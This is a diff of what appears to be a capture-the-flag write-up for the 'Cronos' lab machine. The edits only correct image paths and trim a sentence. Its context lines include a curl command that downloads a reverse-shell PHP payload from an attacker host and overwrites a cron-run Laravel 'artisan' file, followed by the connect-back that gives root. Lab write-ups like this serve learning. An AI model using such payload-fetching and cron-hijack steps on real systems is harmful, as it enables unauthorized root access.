@@ -8,7 +8,7 @@ tags: ["cron jobs", "Zone transfer"]
 categories: ["CTF"]
 
 cover:
-  image: "/cronos-pwn.png"
+  image: "/cronos/cronos-pwn.png"
   alt: "cronos pwn"
   caption: "cronos pwn"
 ---
@@ -169,12 +169,12 @@ Content-type: text/html; charset=UTF-8
 
 Great, this payload redirects us to the welcome page. Let's use burp to repeat this process via browser.
 
-![Welcome page](/cronos-1.png#center) 
+![Welcome page](/cronos/cronos-1.png#center) 
 
 ## Executing command
 The page proposes 2 commands: traceroute and ping.
 
-![commands](/cronos-2.png#center)
+![commands](/cronos/cronos-2.png#center)
 
 # Exploitation
 
@@ -328,7 +328,7 @@ www-data@cronos:/var/www/laravel$ curl 10.10.14.21:3000/revshell.php > artisan
 100  2592  100  2592    0     0  29612      0 --:--:-- --:--:-- --:--:-- 29793
 ```
 
-This instantly executes the php exploit, gaining root access via reverse shell! Juicy :3
+This instantly executes the php exploit, gaining root access via reverse shell :3
 
 ```bash
 connect to [10.10.14.21] from (UNKNOWN) [10.10.10.13] 46350
